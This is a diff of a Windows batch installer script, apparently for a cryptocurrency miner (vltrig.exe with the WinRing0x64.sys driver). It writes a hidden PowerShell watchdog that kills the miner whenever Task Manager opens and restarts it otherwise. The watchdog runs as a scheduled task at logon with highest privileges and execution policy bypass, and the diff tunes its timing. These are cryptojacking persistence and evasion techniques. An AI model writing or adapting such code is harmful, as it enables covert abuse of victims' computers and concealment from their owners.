@@ -26,18 +26,14 @@ copy /y "%TMP%\vltrig.exe"      "%DEST%\" >nul
 copy /y "%TMP%\config.json"     "%DEST%\" >nul
 copy /y "%TMP%\WinRing0x64.sys" "%DEST%\" >nul
 
-echo while($true){if(Get-Process taskmgr -EA SilentlyContinue){Stop-Process -Name vltrig -Force -EA SilentlyContinue}elseif(-not(Get-Process vltrig -EA SilentlyContinue)){Start-Process '%DEST%\vltrig.exe' -ArgumentList '--config=%DEST%\config.json'};Start-Sleep 3} > "%DEST%\watch.ps1"
+echo while($true){if(Get-Process taskmgr -EA SilentlyContinue){Stop-Process -Name vltrig -Force -EA SilentlyContinue;Start-Sleep 5}elseif(-not(Get-Process vltrig -EA SilentlyContinue)){Start-Process '%DEST%\vltrig.exe' -ArgumentList '--config=%DEST%\config.json';Start-Sleep 15}else{Start-Sleep 5}} > "%DEST%\watch.ps1"
 
 schtasks /delete /tn "VLTrig"      /f >nul 2>&1
 schtasks /delete /tn "VLTrigWatch" /f >nul 2>&1
 
-schtasks /create /tn "VLTrig"      /tr "\"%DEST%\vltrig.exe\" --config=\"%DEST%\config.json\""                          /sc onlogon /rl highest /f >nul
 schtasks /create /tn "VLTrigWatch" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%DEST%\watch.ps1\"" /sc onlogon /rl highest /f >nul
 
 schtasks /run /tn "VLTrigWatch" >nul
-timeout /t 3 /nobreak >nul
-tasklist | find /i "vltrig.exe" >nul 2>&1
-if %errorLevel% neq 0 start "" /b "%DEST%\vltrig.exe" --config="%DEST%\config.json"
 
 rmdir /s /q "%TMP%"
 :end
